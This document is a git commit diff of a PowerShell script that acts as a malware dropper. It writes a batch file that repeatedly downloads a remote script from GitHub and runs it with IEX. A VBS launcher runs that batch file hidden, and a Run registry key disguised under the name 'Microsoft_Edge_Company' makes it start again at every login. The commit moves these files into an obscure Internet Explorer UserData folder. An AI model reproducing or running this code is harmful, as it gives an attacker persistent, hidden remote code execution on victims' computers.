61657acf2892e31864cfcabdb9a3eb17f9a2a01f
alejq41 <93050806+alejq41@users.noreply.github.com>
2022-08-24 14:05:06 -0500

    Update samsiel2.ps1

--- samsiel2.ps1
+++ samsiel2.ps1
@@ -1,10 +1,10 @@
-md C:\Users\User\Downloads\ser; $contentToAdd = @"
+md %APPDATA%\Microsoft\Internet Explorer\UserData\Low; $contentToAdd = @"
 :a
 powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercod1.ps1').GetResponse().GetResponseStream()).ReadToEnd());
 timeout /t 30
 goto a
-"@; add-content "C:\Users\User\Downloads\ser/seruex.bat" $contenttoadd; $contentToAdd = @"
+"@; add-content "%APPDATA%\Microsoft\Internet Explorer\UserData\Low/seruex.bat" $contenttoadd; $contentToAdd = @"
 set objshell = createobject("wscript.shell")
 objshell.run "seruex.bat",vbhide
-"@; add-content "C:\Users\User\Downloads\ser/seruex.vbs" $contenttoadd; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d C:\Users\User\Downloads\ser\seruex.vbs; cd C:\Users\User\Downloads\ser; ./seruex.vbs
+"@; add-content "%APPDATA%\Microsoft\Internet Explorer\UserData\Low/seruex.vbs" $contenttoadd; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d %APPDATA%\Microsoft\Internet Explorer\UserData\Low; cd %APPDATA%\Microsoft\Internet Explorer\UserData\Low; ./seruex.vbs
 exit
